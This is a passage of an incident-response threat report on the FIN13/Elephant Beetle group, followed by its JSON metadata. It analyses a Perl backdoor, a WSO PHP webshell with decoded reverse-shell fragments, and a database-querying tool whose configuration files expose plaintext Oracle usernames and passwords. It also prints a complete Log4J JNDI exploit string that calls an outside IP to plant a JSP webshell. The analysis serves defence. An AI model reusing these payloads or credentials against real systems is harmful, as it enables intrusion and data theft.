$client = $server -> accept()) {\n\n$client -> autoflush(1);\nmy %request = ();\nmy %data; {\n\nlocal $/ = Socket::CRLF;\nwhile (<$client>) {\nchomp;\nif (/\\s * (\\w + )\\s * ([^\\s] + )\\s * HTTP\\/(\\d.\\d)/) {\n$request {\n\nMETHOD\n} = uc $1;\n$request {\n\nURL\n} = $2;\n$request {\n\nHTTP_VERSION\n} = $3;\n}\nelsif (/:/) {\n\n(my $type, my $val) = split /:/, $_, 2;\n$type = ~ s / ^\\s + //;\nforeach ($type, $val) {\n\ns/^\\s+//; s/\\s+$//;\n}\n$request{lc $type} = $val; }\nelsif (/^$/) {\n\nread($client, $request{CONTENT}, $request{‘content-length’})\nif defined $request{‘content-length’};\nlast;\n}\n}\n}\nif ($request{METHOD} eq ‘POST’){\n\n%data = parse_form($request{CONTENT});\nprint $client “HTTP/1.0 200 OK”, Socket::CRLF;\nprint $client “Content-Type: text/plain”, Socket::CRLF;\nprint $client Socket::CRLF;\nprint $client $data{output};\n}\nclose $client;\n}\n\n\nFigure 49: Final segment of 65.txt decoded code\n\n\n-----\n\nFigure 50 shows two examples CURL-based interaction with the Perl backdoor in a test lab:\n\nFigure 50: Example of 65.txt perl backdoor interaction\n\n### PHP Webshell\n\nOur IR analysts found this webshell from one of the initial compromised machine of case 1:\n\nChart10.php (hash SHA1: 12088138171164c0c256f608b434eb73c0c957d7).\n\nThe web shellcode is directly linked with WSO a common web shell among cybercriminals because of its particularly powerful\nset of features such as:\n\n - Password protection\n\n - Server information disclosure\n\n - File management features like uploading, downloading, or editing files, creating directories, browsing through directories,\nand searching for text in files\n\n - Command-line console\n\n - Database administration\n\n - PHP code execution\n\n - Encoding and decoding text input\n\n - Brute-force attacks against FTP or database servers\n\n - Installation of a Perl script to function as a more direct backdoor on the server\n\nWSO is designed to be used via a web browser, and it has a simple user-friendly interface, making it quite easy for any\nattacker to learn and to use.\n\nWSO stands for “web shell by oRb.”, usually this string is present in the Web Shell code. Initially reported in 2009, it comes\nfrom Russian developers, and it was originally proposed by a user named oRb, on a Russian underground community in 2008.\n\noRb, the developer, continued to post updates and new versions of the script and the community published a number of major\nreleases, until in 2019 WSO reached version 4.1.3. However, the most popular versions are version 2.1 and version 2.5.\n\n\n-----\n\nIn our case, the Web shell version is 2.1 as highlighted in the following figure:\n\nFigure 51: Webshell details allowing classification\n\nThe initial analysis on the Webshell showed a number of peculiar traits:\n\n\n\\”aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbM F07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj\n1pbmV0X2F0b24oJHR\\”.\n\n\nThis is translated in the following instructions:\n\n\nho “`id`”;/bin/sh’;\n$0=$cmd;\n$target=$ARGV[0];\n$port=$ARGV[1];\n$iaddr=inet_aton($t\n\n\nWhich in turn, is a basic instancing of the command injection used by the Web shell.\n\n\n\\”KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTs\nNCmNsb3NlKFNUREl\\”.\n\n\nOnce translated it appears as:\n\n\n);\nopen(STDOUT, “>&SOCKET”);\nopen(STDERR, “>&SOCKET”);\nsystem($system);\nclose(STDI\n\n\nThis redirect stdout to a socket to ensure functionality for the reverse shell. The following piece of the Web shell code, instead,\n\n\n\\”Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==\\”;\n\n\nDecoded it looks like this:\n\n\n;\ndup2(fd, 2);\nexecl(“/bin/sh”,”sh -i”, NULL);\nclose(fd);\n}\n\n\nIt is used to sync the input and the output from Web shell.\n\n\n-----\n\n### S0b.j / S0b.Jar\n\nS0b.j / S0b.Jar is a java executable that will connect to a configured database and query based on the arguments provided.\n\nThis program was used to connect to internal Customer’s databases and appear to have targeted at least two hosts:\n\n - lnxrhacab.unix.*******.com:1525/BIOPICS\n\n - (DESCRIPTION=(LOAD_BALANCE=YES)(FAILOVER=ON)(ADDRESS_LIST=(ADDRESS=(PROTOCOL=tcp)\n(HOST=10.96.160.1)(PORT=1526))(ADDRESS=(PROTOCOL=tcp)(HOST=10.96.160.5)(PORT=1526)))(CONNECT_\nDATA=(SERVICE_NAME=ISIS_IMG)))\n\nFigure 52: S0b Arguments\n\nThe properties of the “conf” file match those listed in “str-*.txt” files in the same directory.\n\nFigure 53: Configuration Class Properties\n\nThese configuration files contain the credentials for two accounts.\n\n\nclass=oracle.jdbc.OracleDriver\nconstr=jdbc:oracle:thin:@(DESCRIPTION=(LOAD_BALANCE=YES)(FAILOVER=ON)(ADDRESS_LIST=(ADDRESS=(PROTOCOL=tcp)\n(HOST=10.96.160.1)(PORT=1526))(ADDRESS=(PROTOCOL=tcp)(HOST=10.96.160.5)(PORT=1526)))(CONNECT_DATA=(SERVICE_\nNAME=ISIS_IMG)))\nusr=APPIMAGEADM\npwd=Lm9_C4str3s\n\n\nFigure 54: /srv/www/htdocs/gif/str-isis.txt Contents\n\n\n-----\n\nclass=oracle.jdbc.OracleDriver\nconstr=jdbc:oracle:thin:@//lnxrhacab.unix.*******.com:1525/BIOPICS\nusr=IOADMIN\npwd=Kmu20$2020\n\n\nFigure 55: /srv/www/htdocs/gif/str-bio.txt Contents\n\n### RawCap\n\n_RawCap is a free command line sniffer for Windows. It can packet capture any interface that uses IPv4 and does not_\nrequire any DLLs.\n\nThe file size is around 48 kB. Figure 44 and Figure 45 show some interesting Unicode strings related to two RawCap\nexecutable files found.\n\nHighlighted in the figures are the file version and filename as shown in the Unicode string output.\n\n\nCompanyName\nNETRESEC AB\nFileDescription\nRawCap\nFileVersion\n0.2.0.0\nInternalName\nRawCap.exe\nLegalCopyright\nCopyright NETRESEC AB 2020\nLegalTrademarks\nOriginalFilename\nRawCap.exe\nProductName\nRawCap\nProductVersion\n0.2.0.0\nAssembly Version\n0.2.0.0\n\n\nCompanyName\nNETRESEC AB\nFileDescription\nRawCap\nFileVersion\n0.1.5.0\nInternalName\nRawCap.exe\nLegalCopyright\nCopyright NETRESEC AB 2013\nOriginalFilename\nRawCap.exe\nProductName\nRawCap\nProductVersion\n0.1.5.0\nAssembly Version\n0.1.5.0\n\n\nFigure 56: RawCap (0.2.0.0)\n\nFigure 57: RawCap (0 1 5 0)\n\n\n-----\n\nLog4J exploit implanting Webout.jsp webshell\n\n\n‘${jndi:ldap://45.76.223.23:443/TomcatBypass/Command/Base64/ZWNobyAiJmx0OyUhIFN0cmluZyB4Yz1cIjNjNmUwYjhhOWMxNTIyNGFcIjsgU3RyaW5nIHBhc3M9XCJSRURBQ1RFRFwiOyBTdHJpbmcgbWQ1PW1kNShwYXNzK3hjKTsgY2xhc3MgWCBleHRlbmRzIENsYXNzTG9hZGVye3B1YmxpYyBYKENsYXNzTG9hZGVyIHope3N1cGVyKHopO31wdWJsaWMgQ2xhc3MgUShieXRlW10gY2Ipe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhjYiwgMCwgY2IubGVuZ3RoKTt9IH1wdWJsaWMgYnl0ZVtdIHgoYnl0ZVtdIHMsYm9vbGVhbiBtKXsgdHJ5e2phdmF4LmNyeXB0by5DaXBoZXIgYz1qYXZheC5jcnlwdG8uQ2lwaGVyLmdldEluc3RhbmNlKFwiQUVTXCIpO2MuaW5pdChtPzE6MixuZXcgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyh4Yy5nZXRCeXRlcygpLFwiQUVTXCIpKTtyZXR1cm4gYy5kb0ZpbmFsKHMpOyB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXtyZXR1cm4gbnVsbDsgfX0gcHVibGljIHN0YXRpYyBTdHJpbmcgbWQ1KFN0cmluZyBzKSB7U3RyaW5nIHJldCA9IG51bGw7dHJ5IHtqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QgbTttID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKFwiTUQ1XCIpO20udXBkYXRlKHMuZ2V0Qnl0ZXMoKSwgMCwgcy5sZW5ndGgoKSk7cmV0ID0gbmV3IGphdmEubWF0aC5CaWdJbnRlZ2VyKDEsIG0uZGlnZXN0KCkpLnRvU3RyaW5nKDE2KS50b1VwcGVyQ2FzZSgpO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7fXJldHVybiByZXQ7IH0gcHVibGljIHN0YXRpYyBTdHJpbmcgYmFzZTY0RW5jb2RlKGJ5dGVbXSBicykgdGhyb3dzIEV4Y2VwdGlvbiB7Q2xhc3MgYmFzZTY0O1N0cmluZyB2YWx1ZSA9IG51bGw7dHJ5IHtiYXNlNjQ9Q2xhc3MuZm9yTmFtZShcImphdmEudXRpbC5CYXNlNjRcIik7T2JqZWN0IEVuY29kZXIgPSBiYXNlNjQuZ2V0TWV0aG9kKFwiZ2V0RW5jb2RlclwiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZChcImVuY29kZVRvU3RyaW5nXCIsIG5ldyBDbGFzc1tdIHsgYnl0ZVtdLmNsYXNzIH0pLmludm9rZShFbmNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZSkge3RyeSB7IGJhc2U2ND1DbGFzcy5mb3JOYW1lKFwic3VuLm1pc2MuQkFTRTY0RW5jb2RlclwiKTsgT2JqZWN0IEVuY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoU3RyaW5nKUVuY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoXCJlbmNvZGVcIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlMikge319cmV0dXJuIHZhbHVlOyB9IHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGJhc2U2NERlY29kZShTdHJpbmcgYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtieXRlW10gdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoXCJqYXZhLnV0aWwuQmFzZTY0XCIpO09iamVjdCBkZWNvZGVyID0gYmFzZTY0LmdldE1ldGhvZChcImdldERlY29kZXJcIiwgbnVsbCkuaW52b2tlKGJhc2U2NCwgbnVsbCk7dmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoXCJkZWNvZGVcIiwgbmV3IENsYXNzW10geyBTdHJpbmcuY2xhc3MgfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoXCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyXCIpOyBPYmplY3QgZGVjb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOyB2YWx1ZSA9IChieXRlW10pZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZChcImRlY29kZUJ1ZmZlclwiLCBuZXcgQ2xhc3NbXSB7IFN0cmluZy5jbGFzcyB9KS5pbnZva2UoZGVjb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUyKSB7fX1yZXR1cm4gdmFsdWU7IH0lJmd0OyZsdDsldHJ5e2J5dGVbXSBkYXRhPWJhc2U2NERlY29kZShyZXF1ZXN0LmdldFBhcmFtZXRlcihwYXNzKSk7ZGF0YT14KGRhdGEsIGZhbHNlKTtpZiAoc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoXCJwYXlsb2FkXCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZShcInBheWxvYWRcIixuZXcgWCh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuUShkYXRhKSk7fWVsc2V7cmVxdWVzdC5zZXRBdHRyaWJ1dGUoXCJwYXJhbWV0ZXJzXCIsZGF0YSk7amF2YS5pby5CeXRlQXJyYXlPdXRwdXRTdHJlYW0gYXJyT3V0PW5ldyBqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSgpO09iamVjdCBmPSgoQ2xhc3Mpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoXCJwYXlsb2FkXCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKGFyck91dCk7Zi5lcXVhbHMocGFnZUNvbnRleHQpO3Jlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMCwxNikpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9JSZndDsiJmd0Oy9vcHQvc2FzL3N3L3RvbWNhdC9pbnN0MS93ZWJhcHBzL1JPT1QvanNwL3Vwc3RhcnQuanNw=}’.”\n\n\nThe resulting webshell is upstart2.jsp:\n[https://github.com/tennc/webshell/blob/master/jsp/shell.jsp](https://github.com/tennc/webshell/blob/master/jsp/shell.jsp)\n\n[1https://malpedia.caad.fkie.fraunhofer.de/actor/fin13](https://malpedia.caad.fkie.fraunhofer.de/actor/fin13)\n\n[2https://malpedia.caad.fkie.fraunhofer.de/actor/elephant_beetle](https://malpedia.caad.fkie.fraunhofer.de/actor/elephant_beetle)\n\n[3https://f.hubspotusercontent30.net/hubfs/8776530/Sygnia-%20Elephant%20Beetle_Jan2022.pdf](https://f.hubspotusercontent30.net/hubfs/8776530/Sygnia-%20Elephant%20Beetle_Jan2022.pdf)\n\n[4https://www.mandiant.com/resources/fin13-cybercriminal-mexico](https://www.mandiant.com/resources/fin13-cybercriminal-mexico)\n\n[5https://blog.sygnia.co/elephant-beetle-an-organized-financial-theft-operation](https://blog.sygnia.co/elephant-beetle-an-organized-financial-theft-operation)\n\n[6https://f.hubspotusercontent30.net/hubfs/8776530/Sygnia-%20Elephant%20Beetle_Jan2022.pdf](https://f.hubspotusercontent30.net/hubfs/8776530/Sygnia-%20Elephant%20Beetle_Jan2022.pdf)\n\n[7https://www.exploit-db.com/exploits/46814](https://www.exploit-db.com/exploits/46814)\n\n### About NetWitness\n\nNetWitness provides comprehensive and highly scalable threat detection and response capabilities for organizations\naround the world. NetWitness XDR delivers complete visibility combined with applied threat intelligence and user behavior\nanalytics to detect, prioritize, investigate threats, and automate response. This empowers security analysts to be more\nefficient and stay ahead of business-impacting threats. For more information, go to netwitness.com.\n\n©2022 RSA Security LLC or its affiliates. All rights reserved. RSA and the RSA logo are trademarks of RSA Security i\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://www.netwitness.com/wp-content/uploads/FIN13-Elephant-Beetle-NetWitness.pdf"
    ],
    "report_names": [
        "FIN13-Elephant-Beetle-NetWitness.pdf"
    ],
    "threat_actors": [
        {
            "id": "575d8adf-f451-4110-b1c0-89fb463e99c0",
            "created_at": "2022-10-25T16:07:23.637493Z",
            "updated_at": "2025-03-27T02:02:09.900204Z",
            "deleted_at": null,
            "main_name": "FIN13",
            "aliases": [],
            "source_name": "ETDA:FIN13",
            "tools": [
                "BLUEAGAVE",
                "BUSTEDPIPE",
                "CLOSEWATCH",
                "GetUserSPNS.vbs",
                "GoBot2",
                "HOTLANE",
                "JSPRAT",
                "MAILSLOT",
                "PowerSploit",
                "ProcDump",
                "SHELLSWEEP",
                "SIXPACK",
                "SPINOFF",
                "SWEARJAR",
                "Tiny SHell",
                "nmap",
                "tsh"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "50b43f44-b93c-4377-82bc-d6e9c7ef5ee6",
            "created_at": "2022-10-25T16:07:23.573424Z",
            "updated_at": "2025-03-27T02:02:09.872253Z",
            "deleted_at": null,
            "main_name": "Elephant Beetle",
            "aliases": [
                "TG2003"
            ],
            "source_name": "ETDA:Elephant Beetle",
            "tools": [
                "JSPSPY",
                "MiniWebCmdShell",
                "jsp File browser",
                "reGeorg"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7aa1288a-61ec-4793-b543-9fedc26b9b03",
            "created_at": "2023-11-01T02:01:06.805323Z",
            "updated_at": "2025-03-27T02:00:55.555589Z",
            "deleted_at": null,
            "main_name": "FIN13",
            "aliases": [
                "FIN13",
                "Elephant Beetle"
            ],
            "source_name": "MITRE:FIN13",
            "tools": [
                "Impacket",
                "Mimikatz",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f57e32ac-9f90-471d-93ba-7f6d8b05e6c1",
            "created_at": "2023-01-06T13:46:39.29882Z",
            "updated_at": "2025-03-27T02:00:03.044264Z",
            "deleted_at": null,
            "main_name": "FIN13",
            "aliases": [
                "TG2003",
                "Elephant Beetle"
            ],
            "source_name": "MISPGALAXY:FIN13",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041820,
    "ts_creation_date": 1658149472,
    "ts_modification_date": 1659103560,
    "files": {
        "pdf": "https://archive.orkl.eu/0eae1569a895f6c5c299a44de8f5cab5630ac0b8.pdf",
        "text": "https://archive.orkl.eu/0eae1569a895f6c5c299a44de8f5cab5630ac0b8.txt",
        "img": "https://archive.orkl.eu/0eae1569a895f6c5c299a44de8f5cab5630ac0b8.jpg"
    }
}